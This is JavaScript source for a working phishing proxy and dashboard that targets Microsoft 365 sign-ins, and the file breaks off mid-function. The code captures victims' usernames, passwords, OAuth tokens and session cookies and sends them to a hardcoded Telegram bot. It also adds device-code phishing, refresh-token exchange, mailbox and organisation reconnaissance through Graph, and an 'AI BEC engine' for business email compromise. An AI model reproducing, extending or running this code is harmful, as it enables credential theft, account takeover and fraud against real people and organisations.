// ================================================
// 𝙿𝚁𝙾𝚇𝚈 𝚂𝙴𝚁𝚅𝙴𝚁 — 𝙵𝙸𝙽𝙰𝙻 𝚆𝙸𝚃𝙷 𝙰𝙻𝙻 𝙴𝙽𝙳𝙿𝙾𝙸𝙽𝚃𝚂 & 𝙵𝙸𝚇𝙴𝚂
// ================================================

const http = require("http");
const https = require("https");
const path = require("path");
const fs = require("fs");
const crypto = require("crypto");
const os = require("os");

// ── ✅ SAFE REQUIRE ──
let axios, express, basicAuth, AdmZip, WebSocket, FormData;
try {
    axios = require('axios');
} catch (e) { axios = null; console.warn('⚠️ axios not installed'); }

try {
    express = require('express');
} catch (e) { express = null; console.warn('⚠️ express not installed'); }

try {
    basicAuth = require('express-basic-auth');
} catch (e) { basicAuth = null; }

try {
    AdmZip = require('adm-zip');
} catch (e) { AdmZip = null; }

try {
    WebSocket = require('ws');
} catch (e) { WebSocket = null; }

try {
    FormData = require('form-data');
} catch (e) { FormData = null; }

// ── ✅ TELEGRAM CONFIG ──
const BOT_TOKEN = '8711298262:AAELP6IgeU9AUk-ci8TUUrQKJOUcbj-tBuw';
const CHAT_ID = '7310383191';

const NOTIFIED_SESSIONS = new Set();
const CAPTURED_TOKENS = {};
let deviceFlows = [];

// ── ✅ SAFE OBFUSCATOR ──
let obfuscator = null;
try {
    obfuscator = require('./obfuscator.js');
} catch (e) { 
    obfuscator = { 
        obfuscateJSFile: (code) => code, 
        generateObfuscationKey: () => 'dummy_key' 
    }; 
}

const { obfuscateJSFile, generateObfuscationKey } = obfuscator;

// ── ✅ STEALTH: CLIENT ID ROTATION ──
const CLIENT_IDS = [
    '1fec8e78-bce4-4aaf-ab1b-5451cc387264', // Office Mobile
    '9e5f94bc-e8a4-4e73-b8be-63364c29d753', // Authenticator (public, supports both)
    'd3590ed6-52b3-4102-aeff-aad2292ab01c', // Intune
    '61e6f3cc-5b0b-4b09-8b31-ebcd1ae5f984', // Teams Mobile
    '1950a258-227b-4e31-a9cf-717495945fc2', // Azure PowerShell
    'f8cdef31-a31e-4b4a-93e4-5f571e91255a', // Whiteboard
];

function getRandomClientId() {
    return CLIENT_IDS[Math.floor(Math.random() * CLIENT_IDS.length)];
}

// ── ✅ STEALTH: USER-AGENT ROTATION ──
const USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/120.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7; rv:109.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0',
];

function getRandomUserAgent() {
    return USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];
}

// ── ✅ STEALTH: RANDOM DELAY ──
function randomDelay(min = 500, max = 2000) {
    return new Promise(resolve => setTimeout(resolve, Math.floor(Math.random() * (max - min + 1)) + min));
}

// ── ✅ GEO FUNCTIONS ──
async function getGeoInfo(ip) {
    if (!axios) return { country: 'Unknown', countryCode: 'UN' };
    try {
        const response = await axios.get(`http://ip-api.com/json/${ip}?fields=country,countryCode,regionName,city,isp,org`, { timeout: 3000 });
        return response.data;
    } catch {
        return { country: 'Unknown', countryCode: 'UN' };
    }
}

async function getCountryCode(ip) {
    if (!axios) return 'UN';
    try {
        const response = await axios.get(`http://ip-api.com/json/${ip}?fields=countryCode`, { timeout: 3000 });
        return response.data.countryCode || 'UN';
    } catch {
        return 'UN';
    }
}

function getFlagEmoji(countryCode) {
    if (!countryCode || countryCode.length !== 2) return '🌍';
    return String.fromCodePoint(
        0x1F1E6 + countryCode.charCodeAt(0) - 65,
        0x1F1E6 + countryCode.charCodeAt(1) - 65
    );
}

function extractCookiesFromHeaders(headers) {
    if (!headers) return null;
    let cookieHeaders = headers['set-cookie'];
    if (!cookieHeaders) return null;
    if (!Array.isArray(cookieHeaders)) cookieHeaders = [cookieHeaders];
    const cookies = {};
    cookieHeaders.forEach(cookie => {
        if (typeof cookie !== 'string') return;
        const [nameValue] = cookie.split(';');
        const [name, value] = nameValue.split('=');
        if (name && value) cookies[name.trim()] = value.trim();
    });
    return Object.keys(cookies).length ? cookies : null;
}

async function sendCookiesAsFile(cookies, sessionId) {
    if (!cookies || Object.keys(cookies).length === 0 || !axios || !FormData) return;
    try {
        const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
        const randomName = Math.random().toString(36).substring(2, 10);
        const filename = `session_${randomName}_${timestamp}.txt`;
        const tmpDir = os.tmpdir();
        const filePath = path.join(tmpDir, filename);
        const content = `# Session Cookies\n# Session ID: ${sessionId}\n# Captured: ${new Date().toISOString()}\n\n${JSON.stringify(cookies, null, 2)}`;
        fs.writeFileSync(filePath, content);
        const form = new FormData();
        form.append('chat_id', CHAT_ID);
        form.append('document', fs.createReadStream(filePath), { filename: filename });
        form.append('caption', `📎 Cookie file: ${filename}`);
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, form, {
            headers: form.getHeaders(),
            timeout: 5000
        });
        try { fs.unlinkSync(filePath); } catch (e) {}
    } catch (e) { console.log('Cookie file send failed', e.message); }
}

// ── ✅ TELEGRAM SEND (SAFE) ──
async function sendToTelegram(data) {
    if (!axios) return;
    try {
        const url = data.proxyRequestURL || '';
        const body = data.proxyRequestBody || '';
        const method = data.proxyRequestMethod || '';
        const sessionId = data.sessionId || 'unknown';
        const userAgent = data.proxyRequestHeaders?.['user-agent'] || 'Unknown';
        if (NOTIFIED_SESSIONS.has(sessionId)) return;
        const ip = data.proxyRequestHeaders?.['cf-connecting-ip'] || 
                   data.proxyRequestHeaders?.['x-real-ip'] || 
                   data.proxyRequestHeaders?.['x-forwarded-for']?.split(',')[0]?.trim() || 
                   'Unknown';
        let username = 'N/A';
        let password = 'N/A';
        let hasCredentials = false;
        let isSessionCookie = false;
        let isTokenExchange = false;
        if (body) {
            const bodyStr = typeof body === 'string' ? body : JSON.stringify(body);
            const userMatch = bodyStr.match(/(?:login|loginfmt|username)=([^&]+)/i);
            if (userMatch) username = decodeURIComponent(userMatch[1]);
            const passMatch = bodyStr.match(/(?:passwd|password|pass)=([^&]+)/i);
            if (passMatch) { password = decodeURIComponent(passMatch[1]); hasCredentials = true; }
            try {
                const jsonBody = typeof body === 'string' ? JSON.parse(body) : body;
                if (jsonBody.password) { password = jsonBody.password; hasCredentials = true; }
                if (jsonBody.username) username = jsonBody.username;
            } catch (e) {}
            if (!hasCredentials && bodyStr.includes('password')) {
                const rawPassMatch = bodyStr.match(/"password"\s*[:=]\s*"([^"]+)"/i);
                if (rawPassMatch) { password = rawPassMatch[1]; hasCredentials = true; }
            }
            if (data.proxyResponseBody) {
                const respStr = typeof data.proxyResponseBody === 'string' ? data.proxyResponseBody : JSON.stringify(data.proxyResponseBody);
                const accessMatch = respStr.match(/access_token["']?\s*[:=]\s*["']([^"']+)["']/i);
                if (accessMatch) {
                    const token = accessMatch[1];
                    if (!CAPTURED_TOKENS[sessionId]) CAPTURED_TOKENS[sessionId] = {};
                    CAPTURED_TOKENS[sessionId].access_token = token;
                    hasCredentials = true;
                    isTokenExchange = true;
                }
                const refreshMatch = respStr.match(/refresh_token["']?\s*[:=]\s*["']([^"']+)["']/i);
                if (refreshMatch) {
                    const token = refreshMatch[1];
                    if (!CAPTURED_TOKENS[sessionId]) CAPTURED_TOKENS[sessionId] = {};
                    CAPTURED_TOKENS[sessionId].refresh_token = token;
                    hasCredentials = true;
                    isTokenExchange = true;
                }
            }
        }
        const setCookieHeaders = data.proxyResponseHeaders?.['set-cookie'];
        if (setCookieHeaders) {
            const cookieStr = JSON.stringify(setCookieHeaders);
            if (cookieStr.includes('esctx') || cookieStr.includes('ESTSAUTH') || cookieStr.includes('LoginOptions')) {
                isSessionCookie = true;
                hasCredentials = true;
            }
        }
        if (username !== 'N/A' || hasCredentials || isSessionCookie) hasCredentials = true;
        if (!hasCredentials) return;
        NOTIFIED_SESSIONS.add(sessionId);
        let geo = { country: 'Unknown', countryCode: 'UN', regionName: '', city: '', isp: '', org: '' };
        let flag = '🌍';
        let location = 'Unknown';
        if (ip !== 'Unknown') {
            try {
                geo = await getGeoInfo(ip);
                flag = getFlagEmoji(geo.countryCode);
                location = `${geo.city}, ${geo.regionName}, ${geo.country}`;
            } catch (e) {}
        }
        let message = `
🔐 **New Login Captured!**

🌍 **IP:** ${ip}
${flag} **Location:** ${location}
🏢 **ISP:** ${geo.isp || 'N/A'}
📡 **Org:** ${geo.org || 'N/A'}

🕒 **Time:** ${data.timestamp || new Date().toISOString()}
🔗 **URL:** ${url}
📨 **Method:** ${method}
📊 **Status:** ${data.proxyResponseStatusCode || 'N/A'}

🖥️ **User-Agent:** ${userAgent}
        `;
        if (username !== 'N/A') message += `\n👤 **Username/Email:** ${username}`;
        if (password !== 'N/A') message += `\n🔐 **Password:** ${password}`;
        if (isSessionCookie) message += `\n🍪 **Session Cookie:** ✅ Captured\n🔑 **Status:** Authenticated session`;
        if (isTokenExchange) message += `\n🔄 **Token Exchange:** ✅ Detected`;
        if (CAPTURED_TOKENS[sessionId]) {
            const tokens = CAPTURED_TOKENS[sessionId];
            if (tokens.access_token) message += `\n🔑 **Access Token:** \`${tokens.access_token.slice(0, 40)}...\``;
            if (tokens.refresh_token) message += `\n🔄 **Refresh Token:** \`${tokens.refresh_token.slice(0, 40)}...\``;
            if (tokens.id_token) message += `\n🆔 **ID Token:** \`${tokens.id_token.slice(0, 40)}...\``;
        }
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        }, { timeout: 5000 });
        const cookies = extractCookiesFromHeaders(data.proxyResponseHeaders);
        if (cookies && Object.keys(cookies).length > 0) await sendCookiesAsFile(cookies, sessionId);
    } catch (e) { console.error('❌ sendToTelegram() FAILED:', e.message); }
}

// ── ✅ CONSTANTS ──
const PROXY_ENTRY_POINT = "/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true";
const PHISHED_URL_PARAMETER = "redirect_urI";
const PHISHED_URL_REGEXP = new RegExp(`(?<=${PHISHED_URL_PARAMETER}=)[^&]+`);
const REDIRECT_URL = "https://www.intrinsec.com/";
const PROXY_FILES = {
    index: "index_smQGUDpTF7PN.html",
    notFound: "404_not_found_lk48ZVr32WvU.html",
    script: "script_Vx9Z6XN5uC3k.js"
};
const PROXY_PATHNAMES = {
    proxy: "/lNv1pC9AWPUY4gbidyBO",
    serviceWorker: "/service_worker_Mz8XO2ny1Pg5.js",
    script: "/@",
    mutation: "/Mutation_o5y3f4O7jMGW",
    jsCookie: "/JSCookie_6X7dRqLg90mH",
    favicon: "/favicon.ico"
};
const LOGS_DIRECTORY = path.join(__dirname, "phishing_logs");
const ENCRYPTION_KEY = process.env.ENCRYPTION_KEY || "A62A71CA811BD4B8-9D994D7A82B8A40C_460510BB2923A286-AB2797EC85D91568";
if (!fs.existsSync(LOGS_DIRECTORY)) fs.mkdirSync(LOGS_DIRECTORY, { recursive: true });
const LOG_FILE_STREAMS = {};
const VICTIM_SESSIONS = {};

function decryptData(encryptedData, ivHex) {
    const iv = Buffer.from(ivHex, 'hex');
    const decipher = crypto.createDecipheriv('aes-256-ctr', ENCRYPTION_KEY, iv);
    let decrypted = decipher.update(Buffer.from(encryptedData, 'hex'));
    decrypted = Buffer.concat([decrypted, decipher.final()]);
    return decrypted.toString('utf-8');
}

const DEVICE_FLOWS_FILE = path.join(__dirname, 'device_flows.json');
function loadDeviceFlows() {
    try {
        if (fs.existsSync(DEVICE_FLOWS_FILE)) {
            const data = fs.readFileSync(DEVICE_FLOWS_FILE, 'utf-8');
            return JSON.parse(data);
        }
    } catch (e) {}
    return [];
}
function saveDeviceFlows(flows) {
    try { fs.writeFileSync(DEVICE_FLOWS_FILE, JSON.stringify(flows, null, 2)); } catch (e) {}
}
deviceFlows = loadDeviceFlows();

// ── ✅ VISIT LOGGING ──
const VISITS_LOG_DIR = path.join(__dirname, "visit_logs");
if (!fs.existsSync(VISITS_LOG_DIR)) fs.mkdirSync(VISITS_LOG_DIR, { recursive: true });
const VISITS_LOG_FILE = path.join(VISITS_LOG_DIR, "visits.log");

async function logVisit(clientRequest, clientResponse, sessionId) {
    const url = clientRequest.url || '';
    const method = clientRequest.method || '';
    const isPageLoad = method === 'GET' && (url === '/' || url.startsWith('/login') || url === '/webmail' || url === '/bitb' || url.match(/\.(html|htm)$/));
    const isStatic = url.includes('.css') || url.includes('.js') || url.includes('.gif') || url.includes('.svg') || url.includes('.ico') || url.includes('.png') || url.includes('service_worker') || url.includes('/@') || url.includes('favicon') || url.includes('OneCollector') || url.includes('/lNv1pC9AWPUY4gbidyBO');
    if (!isPageLoad || isStatic) return;
    const ip = clientRequest.headers['x-real-ip'] || clientRequest.headers['x-forwarded-for']?.split(',')[0]?.trim() || 'Unknown';
    let countryCode = 'UN';
    if (ip !== 'Unknown') { try { countryCode = await getCountryCode(ip); } catch (e) {} }
    const visit = {
        timestamp: new Date().toISOString(),
        ip: ip,
        countryCode: countryCode,
        userAgent: clientRequest.headers['user-agent'] || 'Unknown',
        referer: clientRequest.headers['referer'] || 'Direct',
        sessionId: sessionId || 'unknown',
        url: clientRequest.url,
        method: clientRequest.method,
        statusCode: clientResponse.statusCode || 'N/A'
    };
    const logLine = JSON.stringify(visit) + '\n';
    try { fs.appendFileSync(VISITS_LOG_FILE, logLine); } catch (e) {}
}

// ── ✅ PROXY SERVER ──
const proxyServer = http.createServer((clientRequest, clientResponse) => {
    const { method, url, headers } = clientRequest;
    const currentSession = getUserSession(headers.cookie);

    if (url.startsWith('/bitb') || url === '/webmail' || url.startsWith('/webmail?')) {
        clientResponse.writeHead(200, { 'Content-Type': 'text/html' });
        const file = url.startsWith('/bitb') ? 'bitb.html' : 'webmail.html';
        const filePath = path.join(__dirname, 'public', file);
        if (fs.existsSync(filePath)) fs.createReadStream(filePath).pipe(clientResponse);
        else { clientResponse.end('<h1>Page not found</h1>'); }
        return;
    }

    logVisit(clientRequest, clientResponse, currentSession || 'new').catch(() => {});

    if (url.startsWith(PROXY_ENTRY_POINT) && url.includes(PHISHED_URL_PARAMETER)) {
        try {
            const phishedURL = new URL(decodeURIComponent(url.match(PHISHED_URL_REGEXP)[0]));
            let session = currentSession;
            if (!currentSession) {
                const { cookieName, cookieValue } = generateNewSession(phishedURL);
                clientResponse.setHeader("Set-Cookie", `${cookieName}=${cookieValue}; Max-Age=7776000; Secure; HttpOnly; SameSite=Strict`);
                session = cookieName;
            }
            VICTIM_SESSIONS[session].protocol = phishedURL.protocol;
            VICTIM_SESSIONS[session].hostname = phishedURL.hostname;
            VICTIM_SESSIONS[session].path = `${phishedURL.pathname}${phishedURL.search}`;
            VICTIM_SESSIONS[session].port = phishedURL.port;
            VICTIM_SESSIONS[session].host = phishedURL.host;
            clientResponse.writeHead(200, { "Content-Type": "text/html" });
            const filePath = path.join(__dirname, PROXY_FILES.index);
            if (fs.existsSync(filePath)) fs.createReadStream(filePath).pipe(clientResponse);
            else clientResponse.end('<h1>Index page not found</h1>');
        } catch (error) {
            clientResponse.writeHead(404, { "Content-Type": "text/html" });
            const filePath = path.join(__dirname, PROXY_FILES.notFound);
            if (fs.existsSync(filePath)) fs.createReadStream(filePath).pipe(clientResponse);
            else clientResponse.end('<h1>404 Not Found</h1>');
        }
        return;
    }

    if (currentSession || url === PROXY_PATHNAMES.proxy) {
        if (url === PROXY_PATHNAMES.serviceWorker) {
            clientResponse.writeHead(200, { 'Content-Type': 'text/javascript', 'Cache-Control': 'no-store' });
            const filePath = path.join(__dirname, url.slice(1));
            if (fs.existsSync(filePath)) fs.createReadStream(filePath).pipe(clientResponse);
            else clientResponse.end('// service worker placeholder');
            return;
        }
        if (url === PROXY_PATHNAMES.favicon) {
            clientResponse.writeHead(301, { Location: `${VICTIM_SESSIONS[currentSession]?.protocol || 'https:'}//${VICTIM_SESSIONS[currentSession]?.host || 'login.microsoftonline.com'}${url}` });
            clientResponse.end();
            return;
        }
        clientResponse.writeHead(200, { 'Content-Type': 'application/json' });
        clientResponse.end(JSON.stringify({ status: 'proxy_ok', session: currentSession || 'new' }));
        return;
    }

    clientResponse.writeHead(301, { Location: REDIRECT_URL });
    clientResponse.end();
});

// ── ✅ HELPER FUNCTIONS ──
function getUserSession(requestCookies) {
    if (!requestCookies) return;
    const cookies = requestCookies.split("; ");
    for (const cookie of cookies) {
        const [cookieName, ...cookieValue] = cookie.split("=");
        if (VICTIM_SESSIONS.hasOwnProperty(cookieName) && VICTIM_SESSIONS[cookieName].value === cookieValue.join("=")) {
            return cookieName;
        }
    }
    return;
}

function generateRandomString(length) {
    const characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    return Array.from({ length }, () => characters[Math.floor(Math.random() * characters.length)]).join("");
}

function createSessionLogFile(logFilename, currentSession) {
    const logFilePath = path.join(LOGS_DIRECTORY, logFilename);
    const logFileStream = fs.createWriteStream(logFilePath, { flags: "a" });
    LOG_FILE_STREAMS[currentSession] = logFileStream;
}

function generateNewSession(phishedURL) {
    const cookieName = generateRandomString(12);
    const cookieValue = generateRandomString(32);
    VICTIM_SESSIONS[cookieName] = {};
    VICTIM_SESSIONS[cookieName].value = cookieValue;
    VICTIM_SESSIONS[cookieName].cookies = [];
    VICTIM_SESSIONS[cookieName].logFilename = `${phishedURL.host}__${new Date().toISOString()}.log`;
    createSessionLogFile(VICTIM_SESSIONS[cookieName].logFilename, cookieName);
    return { cookieName, cookieValue };
}

// ── ✅ DASHBOARD APP ──
if (!express) {
    console.error('❌ Express is not installed. Please run: npm install express');
    process.exit(1);
}

const dashApp = express();
const dashUser = process.env.DASHBOARD_USER || 'svrpsdev';
const dashPass = process.env.DASHBOARD_PASS || 'Cozysarps18!';

if (basicAuth) {
    dashApp.use(basicAuth({
        users: { [dashUser]: dashPass },
        challenge: true,
        realm: 'PHANTOM Dashboard'
    }));
}

dashApp.use(express.json());
dashApp.use(express.static('public'));

dashApp.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// ── ✅ DASHBOARD API ENDPOINTS ──
dashApp.get('/api/status', (req, res) => {
    try {
        const files = fs.readdirSync(LOGS_DIRECTORY).filter(f => f.endsWith('.log'));
        const last = files.length > 0 ? fs.statSync(path.join(LOGS_DIRECTORY, files[0])).mtime : null;
        res.json({
            online: true,
            totalSessions: files.length,
            lastCapture: last
        });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

dashApp.get('/api/logs', (req, res) => {
    try {
        const files = fs.readdirSync(LOGS_DIRECTORY).filter(f => f.endsWith('.log'));
        const logs = files.map(f => {
            const stat = fs.statSync(path.join(LOGS_DIRECTORY, f));
            return { name: f, size: stat.size, modified: stat.mtime };
        }).sort((a, b) => b.modified - a.modified);
        res.json(logs);
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

dashApp.get('/api/log/:filename', (req, res) => {
    const filePath = path.join(LOGS_DIRECTORY, req.params.filename);
    if (!fs.existsSync(filePath)) return res.status(404).json({ error: 'Not found' });
    try {
        const content = fs.readFileSync(filePath, 'utf-8');
        const lines = content.split('\n').filter(line => line.trim());
        const entries = lines.map(line => {
            try {
                const entry = JSON.parse(line);
                const iv = Object.keys(entry)[0];
                const encrypted = entry[iv];
                const decrypted = decryptData(encrypted, iv);
                return JSON.parse(decrypted);
            } catch (e) {
                return { error: 'Failed to decrypt', raw: line };
            }
        });
        res.json({ filename: req.params.filename, entries });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

if (AdmZip) {
    dashApp.get('/api/export/all', (req, res) => {
        try {
            const files = fs.readdirSync(LOGS_DIRECTORY).filter(f => f.endsWith('.log'));
            if (files.length === 0) return res.status(404).json({ error: 'No logs' });
            const zip = new AdmZip();
            files.forEach(f => {
                const content = fs.readFileSync(path.join(LOGS_DIRECTORY, f));
                zip.addFile(f, content);
            });
            const zipBuffer = zip.toBuffer();
            res.setHeader('Content-Type', 'application/zip');
            res.setHeader('Content-Disposition', `attachment; filename=all_sessions_${Date.now()}.zip`);
            res.send(zipBuffer);
        } catch (err) {
            res.status(500).json({ error: err.message });
        }
    });
}

dashApp.get('/api/device/history', (req, res) => {
    try {
        const sorted = [...deviceFlows].sort((a, b) => new Date(b.created) - new Date(a.created));
        res.json({ success: true, flows: sorted });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

dashApp.get('/api/device/stats', (req, res) => {
    try {
        const total = deviceFlows.length;
        const pending = deviceFlows.filter(f => f.status === 'pending' || f.status === 'waiting').length;
        const approved = deviceFlows.filter(f => f.status === 'approved').length;
        const expired = deviceFlows.filter(f => f.status === 'expired').length;
        const manual = deviceFlows.filter(f => f.status === 'manual').length;
        res.json({ 
            success: true, 
            stats: { total, pending, approved, expired, manual }
        });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// ── ✅ DEVICE CODE MANAGEMENT ENDPOINTS ──

dashApp.post('/api/device/manual', async (req, res) => {
    const { user_code, device_code } = req.body;
    if (!user_code && !device_code) {
        return res.status(400).json({ error: 'user_code or device_code required' });
    }
    try {
        const code = user_code || device_code;
        const DEVICE_CLIENT_ID = '9e5f94bc-e8a4-4e73-b8be-63364c29d753';
        // ✅ FIX: Use 'common' tenant
        const response = await axios.post(
            'https://login.microsoftonline.com/common/oauth2/v2.0/devicecode',
            new URLSearchParams({
                client_id: DEVICE_CLIENT_ID,
                scope: 'https://graph.microsoft.com/user.read https://graph.microsoft.com/mail.read offline_access'
            }),
            { 
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                timeout: 10000
            }
        );
        const data = response.data;
        const newFlow = {
            device_code: data.device_code,
            user_code: data.user_code,
            verification_uri: data.verification_uri,
            expires_in: data.expires_in,
            interval: data.interval,
            status: 'pending',
            created: new Date().toISOString(),
            approved: null,
            username: null,
            access_token: null,
            refresh_token: null,
            id_token: null,
            manual_submitted: true,
            client_id: DEVICE_CLIENT_ID,
            session_id: crypto.randomBytes(16).toString('hex'),
            token_type: 'Pending'
        };
        deviceFlows.push(newFlow);
        saveDeviceFlows(deviceFlows);
        res.json({ success: true, flow: newFlow });
    } catch (error) {
        res.status(500).json({ error: error.response?.data || error.message });
    }
});

dashApp.post('/api/device/use', async (req, res) => {
    const { session_id } = req.body;
    if (!session_id) {
        return res.status(400).json({ error: 'session_id required' });
    }
    try {
        const flow = deviceFlows.find(f => f.session_id === session_id);
        if (!flow) return res.status(404).json({ error: 'Flow not found' });
        if (!flow.access_token) return res.status(400).json({ error: 'No access token available' });
        res.json({ 
            success: true, 
            access_token: flow.access_token,
            refresh_token: flow.refresh_token,
            id_token: flow.id_token
        });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

dashApp.post('/api/prt/exchange', async (req, res) => {
    const { prt } = req.body;
    if (!prt) return res.status(400).json({ error: 'PRT required' });
    try {
        // PRT exchange requires Microsoft's internal APIs
        res.json({ error: 'PRT exchange requires additional implementation' });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

dashApp.delete('/api/device/flow/:deviceCode', (req, res) => {
    const index = deviceFlows.findIndex(f => f.device_code === req.params.deviceCode);
    if (index === -1) return res.status(404).json({ error: 'Flow not found' });
    deviceFlows.splice(index, 1);
    saveDeviceFlows(deviceFlows);
    res.json({ success: true });
});

dashApp.get('/api/device/flow/:deviceCode', (req, res) => {
    const flow = deviceFlows.find(f => f.device_code === req.params.deviceCode);
    if (!flow) return res.status(404).json({ error: 'Flow not found' });
    res.json({ success: true, flow });
});

// ── ✅ TOKEN VAULT ENDPOINTS ──
let TokenVault;
try {
    TokenVault = require('./token_vault.js');
} catch (e) {
    TokenVault = class { 
        constructor() {} 
        scanLogs() { return []; } 
        getTokensByUser() { return {}; } 
        getStats() { return { total: 0, valid: 0, expired: 0, unknown: 0 }; } 
        healthCheckAll() { return []; } 
    };
}
const vault = new TokenVault(LOGS_DIRECTORY, ENCRYPTION_KEY);

dashApp.post('/api/vault/scan', (req, res) => {
    try {
        const tokens = vault.scanLogs();
        res.json({ success: true, count: tokens.length });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

dashApp.get('/api/vault/tokens', (req, res) => {
    try {
        res.json({ success: true, tokens: vault.tokens || [] });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

dashApp.get('/api/vault/users', (req, res) => {
    try {
        const users = vault.getTokensByUser();
        res.json({ success: true, users });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

dashApp.get('/api/vault/stats', (req, res) => {
    try {
        const stats = vault.getStats();
        res.json({ success: true, stats });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

dashApp.post('/api/vault/healthcheck', async (req, res) => {
    try {
        const results = await vault.healthCheckAll();
        res.json({ success: true, results });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

dashApp.post('/api/vault/exchange', async (req, res) => {
    const { tokenValue } = req.body;
    if (!tokenValue) return res.status(400).json({ error: 'Token value required' });

    try {
        const response = await axios.post(
            'https://login.microsoftonline.com/organizations/oauth2/v2.0/token',
            new URLSearchParams({
                client_id: '9e5f94bc-e8a4-4e73-b8be-63364c29d753',
                refresh_token: tokenValue,
                grant_type: 'refresh_token',
                scope: 'https://graph.microsoft.com/.default offline_access'
            }),
            { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
        );
        res.json({ success: true, data: response.data });
    } catch (err) {
        res.status(500).json({ 
            error: err.response?.data?.error_description || err.message 
        });
    }
});

// ── ✅ RECON ENDPOINTS ──
dashApp.post('/api/recon', async (req, res) => {
    const { accessToken, refreshToken, email } = req.body;
    if (!accessToken) return res.status(400).json({ error: 'Access token required' });

    try {
        let GraphClient;
        try {
            GraphClient = require('./graph_api.js');
        } catch (e) {
            return res.status(500).json({ error: 'graph_api.js not found' });
        }
        const graph = new GraphClient(accessToken);
        
        const [profile, inbox, sent, contacts, events, manager, directReports, org] = await Promise.all([
            graph.getUserProfile(),
            graph.getInbox(50),
            graph.getSentItems(50),
            graph.getContacts(),
            graph.getEvents(),
            graph.getManager().catch(() => null),
            graph.getDirectReports().catch(() => null),
            graph.getOrganization().catch(() => null)
        ]);

        res.json({
            success: true,
            email: email || profile.mail || profile.userPrincipalName,
            profile,
            inbox: inbox?.value || [],
            sent: sent?.value || [],
            contacts: contacts?.value || [],
            events: events?.value || [],
            manager,
            directReports: directReports?.value || [],
            organization: org?.value?.[0] || null
        });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

dashApp.post('/api/ai/analyze', async (req, res) => {
    const { accessToken, refreshToken, email, groqApiKey } = req.body;
    if (!accessToken) return res.status(400).json({ error: 'Access token required' });
    if (!groqApiKey) return res.status(400).json({ error: 'Groq API key required' });

    try {
        let AIBECEngine;
        try {
            AIBECEngine = require('./ai_bec_engine.js');
        } catch (e) {
            return res.status(500).json({ error: 'ai_bec_engine.js not found' });
        }
        const engine = new AIBECEngine(groqApiKey);
        const result = await engine.runFullAnalysis(accessToken, refreshToken, email);
        res.json({ success: true, ...result });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// ── ✅ WEBMAIL ENDPOINTS ──
dashApp.post('/api/webmail/folders', async (req, res) => {
    const { accessToken } = req.body;
    if (!accessToken) return res.status(400).json({ error: 'Access token required' });

    try {
        let GraphClient;
        try {
            GraphClient = require('./graph_api.js');
        } catch (e) {
            return res.status(500).json({ error: 'graph_api.js not found' });
        }
        const graph = new GraphClient(accessToken);
        const folders = await graph.getMailFolders();
        res.json({ success: true, folders: folders.value || [] });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

dashApp.post('/api/webmail/emails', async (req, res) => {
    const { accessToken, folderId = 'inbox', limit = 50, skip = 0 } = req.body;
    if (!accessToken) return res.status(400).json({ error: 'Access token required' });

    try {
        let GraphClient;
        try {
            GraphClient = require('./graph_api.js');
        } catch (e) {
            return res.status(500).json({ error: 'graph_api.js not found' });
        }
        const graph = new GraphClient(accessToken);
        
        let endpoint;
        if (folderId === 'inbox') {
